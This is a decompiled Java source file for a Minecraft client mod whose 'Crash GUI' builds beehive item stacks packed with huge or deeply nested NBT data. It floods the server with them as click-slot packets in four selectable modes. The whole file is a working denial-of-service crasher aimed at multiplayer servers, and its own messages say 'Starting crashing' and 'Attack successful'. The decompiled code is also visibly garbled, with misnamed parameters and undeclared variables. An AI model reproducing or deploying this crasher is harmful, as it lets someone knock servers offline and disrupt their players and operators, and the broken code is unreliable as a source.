package org.jon.magicclient.client.gui;

import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import net.minecraft.class_1713;
import net.minecraft.class_1799;
import net.minecraft.class_1802;
import net.minecraft.class_2487;
import net.minecraft.class_2499;
import net.minecraft.class_2561;
import net.minecraft.class_2813;
import net.minecraft.class_310;
import net.minecraft.class_332;
import net.minecraft.class_342;
import net.minecraft.class_4185;
import net.minecraft.class_437;
import org.jon.magicclient.client.MessageHelper;

public class CrashGui extends class_437 {
   private final MessageHelper msgHelper = new MessageHelper();
   private class_342 packetsField;
   private class_342 sizeField;
   private class_342 depthField;
   private class_342 typeField;

   public CrashGui() {
      super(class_2561.method_43470("chainclient Crash GUI"));
   }

   protected void method_25426() {
      this.packetsField = new class_342(this.field_22793, this.field_22789 / 2 - 100, 50, 200, 20, class_2561.method_43470("Packets"));
      this.sizeField = new class_342(this.field_22793, this.field_22789 / 2 - 100, 80, 200, 20, class_2561.method_43470("Size"));
      this.depthField = new class_342(this.field_22793, this.field_22789 / 2 - 100, 110, 200, 20, class_2561.method_43470("Depth"));
      this.typeField = new class_342(this.field_22793, this.field_22789 / 2 - 100, 140, 200, 20, class_2561.method_43470("Type"));
      this.packetsField.method_1852("50");
      this.sizeField.method_1852("500");
      this.depthField.method_1852("5");
      this.typeField.method_1852("netty1");
      this.method_37063(this.packetsField);
      this.method_37063(this.sizeField);
      this.method_37063(this.depthField);
      this.method_37063(this.typeField);
      this.method_37063(class_4185.method_46430(class_2561.method_43470("Execute Magic1"), (button) -> {
         this.executeMagic1();
      }).method_46434(this.field_22789 / 2 - 100, 180, 200, 20).method_46431());
      this.method_37063(class_4185.method_46430(class_2561.method_43470("Close"), (button) -> {
         this.method_25419();
      }).method_46434(this.field_22789 / 2 - 100, 210, 200, 20).method_46431());
   }

   private void executeMagic1() {
      try {
         int packets = Integer.parseInt(this.packetsField.method_1882());
         int size = Integer.parseInt(this.sizeField.method_1882());
         int depth = Integer.parseInt(this.depthField.method_1882());
         String type = this.typeField.method_1882().toLowerCase();
         this.executeMagic1Crasher(packets, size, depth, type);
         this.msgHelper.sendMessage("Magic1 executed successfully!", true);
      } catch (NumberFormatException var7) {
         this.msgHelper.sendMessage("&cInvalid input! Please enter valid numbers.", true);
      } catch (Exception var8) {
         this.msgHelper.sendMessage("&cError: " + var8.getMessage(), true);
      }

   }

   private void executeMagic1Crasher(int this, int packets, int size, String depth) {
      System.out.println("Executing Chain1 crasher: packets=" + packets + ", size=" + size + ", depth=" + depth + ", type=" + type);
      this.msgHelper.sendMessage("Starting crashing with &fChain1", true);
      class_1799 stack = this.createExploitStack(size, depth, type);

      for(int i = 0; i < packets; ++i) {
         if (class_310.method_1551().method_1562() != null) {
            class_310.method_1551().method_1562().method_2883(new class_2813(0, 0, 20, 0, class_1713.field_7793, stack, new Int2ObjectOpenHashMap()));
         }
      }

      this.msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
   }

   private class_1799 createExploitStack(int this, int size, String depth) {
      class_2487 tag = new class_2487();
      class_2499 beesList = new class_2499();
      int i7 = -1;
      switch(type.hashCode()) {
      case -1048914033:
         if (type.equals("netty1")) {
            i7 = 0;
         }
         break;
      case -1048914032:
         if (type.equals("netty2")) {
            i7 = 2;
         }
         break;
      case 103657880:
         if (type.equals("main1")) {
            i7 = 1;
         }
         break;
      case 103657881:
         if (type.equals("main2")) {
            i7 = 3;
         }
      }

      int i;
      class_2487 beeTag;
      class_2487 entityData;
      switch(i7) {
      case 0:
         for(i = 0; i < size; ++i) {
            beeTag = new class_2487();
            entityData = new class_2487();
            entityData.method_10582("id", "minecraft:bee");
            entityData.method_10548("Health", 10.0F);
            entityData.method_10567("HasNectar", (byte)1);
            entityData.method_10567("HasStung", (byte)0);
            beeTag.method_10566("EntityData", entityData);
            beeTag.method_10569("MinOccupationTicks", 2400);
            beeTag.method_10569("TicksInHive", 1000);
            beesList.add(beeTag);
         }

         tag.method_10566("Bees", beesList);
         tag.method_10582("id", "minecraft:beehive");
         break;
      case 1:
         for(i = 0; i < size; ++i) {
            beeTag = new class_2487();
            entityData = new class_2487();
            class_2487 current = entityData;

            for(int j = 0; j < depth; ++j) {
               class_2487 next = new class_2487();
               next.method_10566("nested", new class_2487());
               current = next;
            }

            entityData.method_10566("deeplyNested", current);
            entityData.method_10582("id", "minecraft:bee");
            entityData.method_10548("Health", 10.0F);
            beeTag.method_10566("EntityData", entityData);
            beesList.add(beeTag);
         }

         tag.method_10566("Bees", beesList);
         tag.method_10582("id", "minecraft:beehive");
         break;
      case 2:
         class_2487 blockEntityTag = new class_2487();
         blockEntityTag.method_10582("id", "minecraft:beehive");

         for(i = 0; i < size; ++i) {
            class_2487 beeEntry = new class_2487();
            entityData = new class_2487();
            entityData.method_10582("id", "minecraft:bee");
            entityData.method_10548("Health", 10.0F);
            entityData.method_10567("HasNectar", (byte)1);
            beeEntry.method_10566("EntityData", entityData);
            beeEntry.method_10569("MinOccupationTicks", 1);
            beeEntry.method_10569("TicksInHive", 1);
            beesList.add(beeEntry);
         }

         blockEntityTag.method_10566("Bees", beesList);
         tag.method_10566("BlockEntityTag", blockEntityTag);
         break;
      case 3:
      default:
         class_2487 blockEntityTag2 = new class_2487();
         class_2487 beeHiveTag = new class_2487();

         for(i = 0; i < size; ++i) {
            beesList.add(new class_2487());
         }

         blockEntityTag2.method_10566("Bees", beesList);
         beeHiveTag.method_10566("BlockEntityTag", blockEntityTag2);
         class_1799 stack2 = new class_1799(class_1802.field_20416);
         stack2.method_7980(beeHiveTag);
         return stack2;
      }

      class_1799 stack = new class_1799(class_1802.field_20416);
      stack.method_7980(tag);
      return stack;
   }

   public void method_25394(class_332 this, int context, int mouseX, float mouseY) {
      this.method_25420(context);
      context.method_27534(this.field_22793, class_2561.method_43470("chainclient Crash GUI"), this.field_22789 / 2, 20, 16777215);
      context.method_27535(this.field_22793, class_2561.method_43470("Packets:"), this.field_22789 / 2 - 150, 55, 16777215);
      context.method_27535(this.field_22793, class_2561.method_43470("Size:"), this.field_22789 / 2 - 150, 85, 16777215);
      context.method_27535(this.field_22793, class_2561.method_43470("Depth:"), this.field_22789 / 2 - 150, 115, 16777215);
      context.method_27535(this.field_22793, class_2561.method_43470("Type:"), this.field_22789 / 2 - 150, 145, 16777215);
      context.method_27535(this.field_22793, class_2561.method_43470("Types: netty1, netty2, main1, main2"), this.field_22789 / 2 - 150, 250, 11184810);
      context.method_27535(this.field_22793, class_2561.method_43470("Press G to open/close this GUI"), this.field_22789 / 2 - 150, 270, 11184810);
      super.method_25394(context, mouseX, mouseY, delta);
   }

   public boolean method_25421() {
      return false;
   }
}
